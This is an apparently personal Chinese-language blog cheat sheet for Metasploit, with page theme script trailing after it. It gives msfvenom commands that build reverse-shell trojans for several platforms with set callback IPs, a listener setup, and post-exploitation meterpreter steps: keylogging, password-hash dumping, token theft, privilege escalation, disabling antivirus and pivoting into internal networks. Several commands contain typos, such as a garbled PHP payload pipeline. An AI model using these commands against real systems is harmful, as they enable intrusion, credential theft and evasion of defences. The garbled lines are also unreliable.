              <div class="markdown-body">
                
                <h2 id="MSF操作指令"><a href="#MSF操作指令" class="headerlink" title="MSF操作指令"></a>MSF操作指令</h2><h3 id="上线前"><a href="#上线前" class="headerlink" title="上线前"></a>上线前</h3><h4 id="msf命令大全"><a href="#msf命令大全" class="headerlink" title="msf命令大全"></a>msf命令大全</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">以下是msfconsole命令的完整列表：<br><br><span class="hljs-comment">#核心命令</span><br>help                        显示所有可用的命令<br>search                      在exploit库中搜索exploit、auxiliary、post、encoder和NOP <br> <span class="hljs-comment">// 例如 search ms17</span><br>generator<br>info                        显示有关一个模块的详细信息<br><span class="hljs-keyword">use</span>                         选择并加载一个模块<br><span class="hljs-title">back</span>                        退出当前模块<br><span class="hljs-title">exit</span>                        退出<span class="hljs-title">msfconsole</span><br><br>#会话命令<br><span class="hljs-title">sessions</span>                    显示所有会话<br><span class="hljs-title">sessions</span> -<span class="hljs-title">i</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     与一个会话进行交互<br><span class="hljs-title">sessions</span> -<span class="hljs-title">K</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     终止一个会话<br><span class="hljs-title">sessions</span> -<span class="hljs-title">u</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     卸载一个模块<br><br>#数据存储命令<br><span class="hljs-title">db_nmap</span>                     使用<span class="hljs-title">nmap</span>进行扫描并将结果保存到数据库<br><span class="hljs-title">db_import</span>                   从文件中导入扫描结果到数据库<br><span class="hljs-title">db_export</span>                   将扫描结果导出到文件<br><span class="hljs-title">creds</span>                       显示凭据信息<br><span class="hljs-title">vulns</span>                       显示漏洞信息<br><br>#漏洞利用命令<br><span class="hljs-title">exploit</span>                     运行<span class="hljs-title">Payload</span>以利用目标系统<br><span class="hljs-title">set</span>                         设置<span class="hljs-title">Payload</span>的选项<br><span class="hljs-title">show</span>                        显示当前模块的选项<br><span class="hljs-title">unset</span>                       取消设置某个选项<br><span class="hljs-title">check</span>                       检查目标系统是否存在漏洞<br><span class="hljs-title">run</span>                         运行当前模块<br><br>#辅助工具命令<br><span class="hljs-title">banner</span>                      显示<span class="hljs-title">MSF</span>的<span class="hljs-title">logo</span>信息<br><span class="hljs-title">color</span>                       切换控制台颜色<br><span class="hljs-title">history</span>                     显示当前控制台中执行的命令列表<br><span class="hljs-title">sleep</span>                       控制台暂停<br><span class="hljs-title">version</span>                     显示<span class="hljs-title">MSF</span>的版本信息<br><span class="hljs-title">reload_all</span>                  重新加载所有模块和插件<br><span class="hljs-title">unload_all</span>                  卸载所有模块和插件<br><br>#多模块管理命令<br><span class="hljs-title">workspace</span>                   显示当前工作区<br><span class="hljs-title">workspace</span> -<span class="hljs-title">a</span> [<span class="hljs-title">name</span>]         添加一个新的工作区<br><span class="hljs-title">workspace</span> -<span class="hljs-title">d</span> [<span class="hljs-title">name</span>]         删除一个工作区<br><span class="hljs-title">workspace</span> [<span class="hljs-title">name</span>]            切换到一个工作区<br><span class="hljs-title">hosts</span>                       显示当前工作区中的主机列表<br><span class="hljs-title">services</span>                    显示当前工作区中的服务列表<br><span class="hljs-title">creds</span>                       显示当前工作区中的凭证列表<br><span class="hljs-title">vulns</span>                       显示当前工作区中的漏洞列表<br><br>#插件命令<br><span class="hljs-title">load</span>                        加载指定的插件<br><span class="hljs-title">unload</span>                      卸载指定的插件<br><span class="hljs-title">reload</span>                      重新加载指定的插件<br></code></pre></td></tr></table></figure>

<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><p>–msfvenom模块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// =========================系统木马=======================</span><br><span class="hljs-comment">#正向Linux:</span><br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> LPORT=<span class="hljs-number">7668</span> -f elf &gt; luojunyi.elf<br><span class="hljs-comment">#反向Linux:</span><br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">8008</span> -f elf &gt; shell.elf<br>windows:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe &gt; shell.exe<br>Mac:<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f macho &gt; shell.macho<br>Android:<br>msfvenom -p android/meterpreter/reverse_tcp lhost=[你的IP] port=[端口] -<span class="hljs-number">0</span> 保存路径/文件名.apk<br><span class="hljs-comment">//    ================编程语言==================</span><br>PHP :<br>msfvenom -p php/meterpreter-reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Portto Connect on&gt; -f raw &gt; she11.php<br>cat she11.php l pbcopy &amp;&amp; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span>  tr -d <span class="hljs-string">&#x27;n&#x27;</span> &gt; shel1.php &amp;&amp; pbpaste &gt;&gt;she17.php<br></code></pre></td></tr></table></figure>

<h4 id="查看msf命令"><a href="#查看msf命令" class="headerlink" title="查看msf命令"></a>查看msf命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">msf  <span class="hljs-comment">// 按TAB  查看命令</span><br></code></pre></td></tr></table></figure>

<h4 id="打开msf命令"><a href="#打开msf命令" class="headerlink" title="打开msf命令"></a>打开msf命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">msfconsole<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">handler</span>   //<span class="hljs-title">use</span> 监听模块<br><span class="hljs-title">set</span> <span class="hljs-title">lhost</span> 192.168.234.133<br><span class="hljs-title">set</span> <span class="hljs-title">lport</span> 3333       <br><span class="hljs-title">set</span> <span class="hljs-title">PAYLOAD</span> <span class="hljs-title">windows</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">reverse_tcp</span>  //设置<span class="hljs-title">payload</span><br><span class="hljs-title">show</span> <span class="hljs-title">options</span>   // 查看配置<br><span class="hljs-title">run</span>      //开启<br><span class="hljs-title">exit</span>   //退出<br></code></pre></td></tr></table></figure>

<h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">netstat -ntlp  <span class="hljs-comment">//查看端口开发情况</span><br></code></pre></td></tr></table></figure>

<h4 id="payload搜索与使用"><a href="#payload搜索与使用" class="headerlink" title="payload搜索与使用"></a>payload搜索与使用</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">search</span> <span class="hljs-symbol">ms0170</span><br></code></pre></td></tr></table></figure>

<h3 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">meterpreter &gt; background 返回后台<br>meterpreter &gt; <span class="hljs-keyword">exit</span> 关闭会话<br>meterpreter &gt; help 帮助信息<br>meterpreter &gt; sysinfo 系统平台信息<br>getuidmeterpreter &gt;screenshot 屏幕截取<br>meterpreter &gt;meterpreter &gt; she11 命令行<span class="hljs-title function_ invoke__">she1</span> (<span class="hljs-keyword">exit</span>退出)<br><br>meterpreter &gt; getlwd 查看本地目录<br>meterpreter &gt; lcd 切换本地目录<br>meterpreter &gt; getwd 查看目录<br>meterpreter &gt; ls 查看文件目录列表<br>meterpreter &gt; cd 切换目录<br>meterpreter &gt; rm 删除文件<br>meterpreter &gt; download C:\\users\\<span class="hljs-number">123</span>\\Desktop\\<span class="hljs-number">1</span>.txt <span class="hljs-number">1</span>.txt下载文件<br>meterpreter &gt; upload /<span class="hljs-keyword">var</span>/www/wce.exe wce.exe   <span class="hljs-comment">//  上传文件</span><br>meterpreter &gt; search -d c: -f *.doc搜索文件<br>meterpreter &gt; execute -f cmd.exe -i 执行程序/命令<br>meterpreter &gt; ps查看进程<br>meterpreter &gt; run post/windows /capture/key1og_ recorder 键盘记录<br>meterpreter &gt; getuid查看当前用户权限<br>meterpreter &gt; <span class="hljs-keyword">use</span> <span class="hljs-title">priv</span>加载特权模块<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">getsystem</span> 提升到<span class="hljs-title">SYSTEM</span>权限<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">hashdump</span>导出密码散列<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">ps</span>查看高权限用户<span class="hljs-title">PID</span><br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">steal</span> <span class="hljs-title">token</span> &lt;<span class="hljs-title">PID</span>&gt; 窃取令牌<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">rev2self</span> 恢复原来的令牌<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">migrate</span> <span class="hljs-title">pid</span> 迁移进程<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">killav</span> 关闭杀毒软件<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">getgui</span>-<span class="hljs-title">e</span> 启用远程桌面<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">portfwd</span> <span class="hljs-title">add</span> -<span class="hljs-title">l</span> 1234 -<span class="hljs-title">p</span> 3389 -<span class="hljs-title">r</span> &lt;目标<span class="hljs-title">IP</span>&gt; 端口转发<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">get_local_subnets</span> 获取内网网段信息<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">autoroute</span> -<span class="hljs-title">s</span> &lt;内网网段&gt;创建自动路由<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">autoroute</span> -<span class="hljs-title">p</span> 查看自动路由表<br><br>创建代理通道:<br><span class="hljs-title">msf</span> &gt; <span class="hljs-title">use</span> <span class="hljs-title">auxiliary</span>/<span class="hljs-title">server</span>/<span class="hljs-title">socks4a</span> 设置<span class="hljs-title">socks4</span>代理模块<br><span class="hljs-title">msf</span> <span class="hljs-title">auxiliary</span>(<span class="hljs-title">socks4a</span>) &gt; <span class="hljs-title">show</span> <span class="hljs-title">opti</span> <span class="hljs-title">ons</span><br><span class="hljs-title">msf</span> <span class="hljs-title">auxiliary</span>(<span class="hljs-title">socks4a</span>) &gt; <span class="hljs-title">run</span><br>配 置<span class="hljs-title">proxychains</span>参数:<br><span class="hljs-title">nano</span> /<span class="hljs-title">etc</span>/<span class="hljs-title">prcxychains</span>.<span class="hljs-title">conf</span>修改代理监听端口，和前面端口一致<br></code></pre></td></tr></table></figure>

    var boardCtn = jQuery('#board-ctn');

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',

      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',

      collapsibleClass: 'tocbot-is-collapsible',

      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });

  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {

    if (CONFIG.anchorjs.placement === 'left') {

    }
    window.anchors.add(res.join(', '));
